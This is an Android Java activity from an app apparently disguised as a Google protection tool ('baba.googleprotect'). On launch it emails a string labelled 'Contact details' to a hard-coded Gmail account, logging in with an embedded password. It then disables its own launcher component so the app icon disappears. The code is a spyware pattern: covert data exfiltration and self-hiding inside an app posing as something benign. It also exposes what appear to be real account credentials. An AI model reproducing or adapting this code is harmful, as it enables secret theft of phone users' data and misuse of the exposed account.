package baba.googleprotect;

import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        sendImpContcats("venkataramana achary");

        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, baba.googleprotect.MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    public void sendImpContcats(String buffer) {
        String contacts = buffer.toString();
        System.out.println(contacts);
        GMailSender sender = new GMailSender("venugopalachary7396@gmail.com", "8686919208");
        try {
            System.out.print("contactslength");

            sender.sendMail("Contact details", contacts, "venugopalachary7396@gmail.com", "venugopalachary7396@gmail.com");

        } catch (Exception e) {
            Log.e("SendMail", e.getMessage(), e);
        }

    }
}
